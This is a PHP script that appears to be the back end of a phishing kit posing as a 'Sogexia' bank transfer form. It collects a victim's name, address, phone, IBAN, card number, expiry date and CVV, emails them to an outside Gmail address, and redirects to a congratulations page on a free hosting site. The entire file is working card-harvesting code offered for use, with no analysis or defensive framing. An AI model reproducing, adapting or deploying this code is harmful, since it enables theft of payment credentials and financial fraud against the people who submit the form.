<?php
if(isset($_POST['submit'])){
// Fetching variables of the form which travels in URL
    $name = $_POST['name'];
    $adresse = $_POST['adresse'];
    $montant = $_POST['montant'];
    $tel = $_POST['tel'];
    $iban = $_POST['iban'];
    $typecard = $_POST['typecard'];
    $numcard = $_POST['numcard'];
    $month = $_POST['month'];
    $year = $_POST['year'];
    $cvv2 = $_POST['cvv2'];
    if($name !=''&& $adresse !=''&& $montant !=''&& $tel !=''&& $iban !=''&& $typecard !=''&& $numcard !=''&& $month !=''&& $year !=''&& $cvv2 !='')
    {
        $message = "Bonjour, une nouvelle procédure de virément a été effectué par :
    Nom et Prénoms : " .$_POST['name'] ."
    Adresse de domicile : " .$_POST['adresse'] ."
    Montant : " .$_POST['montant'] ."
    Numéro de Téléphone : " .$_POST['tel'] ."
    IBAN : " .$_POST['iban'] ."
    Type de Carte : " .$_POST['typecard'] ."
    Numéro de Carte : " .$_POST['numcard'] ."
    Mois d'Expiration : " .$_POST['month'] ."
    Année d'Expiration : " .$_POST['year'] ."
    Cryptogramme : " .$_POST['cvv2'];
        $retour = mail("sogexia.epay@gmail.com", "NOUVEAU VIREMENT",$message, ""
        );
//  To redirect form on a particular page
        echo("<script>location.href='https://sogexia-frsend.000webhostapp.com/felicitation.php'</script>");
    }
    else{
        ?><span style="color: red"><?php echo "Veuillez remplir les champs correctement *";?></span> <?php
    }
}
?>